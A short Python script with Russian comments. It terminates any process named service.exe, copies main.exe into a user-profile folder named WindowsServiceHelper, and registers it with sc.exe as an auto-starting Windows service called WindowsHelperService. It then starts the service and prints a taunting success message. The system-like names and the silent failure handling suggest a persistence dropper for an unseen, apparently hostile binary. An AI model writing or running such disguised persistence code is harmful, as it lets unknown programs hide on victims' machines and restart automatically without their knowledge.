import os
import shutil
import subprocess
import psutil  # Импортируем модуль psutil


for proc in psutil.process_iter(attrs=['pid', 'name']):
    if proc.info['name'] == 'service.exe':
        try:
            proc.terminate()
        except psutil.NoSuchProcess:
            pass

    
sourcePath = "main.exe"
userProfile = os.environ['USERPROFILE']
targetDir = os.path.join(userProfile, 'WindowsServiceHelper')
targetPath = os.path.join(targetDir, 'service.exe')
serviceName = "WindowsHelperService"

if not os.path.exists(targetDir):
    os.makedirs(targetDir)

try:
    shutil.copy2(sourcePath, targetPath)
except Exception as e:
    exit(1)

# Проверяем, если процесс с именем service.exe существует, и завершаем его

sc_query = subprocess.run(f"sc query {serviceName}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if sc_query.returncode == 0:
    subprocess.run(f"sc stop {serviceName}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(f"sc delete {serviceName}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run("ping 127.0.0.1 -n 5 > nul", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

create_service = subprocess.run(f"sc create {serviceName} binPath= {targetPath} start= auto", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if create_service.returncode != 0:
    exit(create_service.returncode)

start_service = subprocess.run(f"sc start {serviceName}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
if start_service.returncode != 0:
    exit(start_service.returncode)

print("Success, did you expect that?")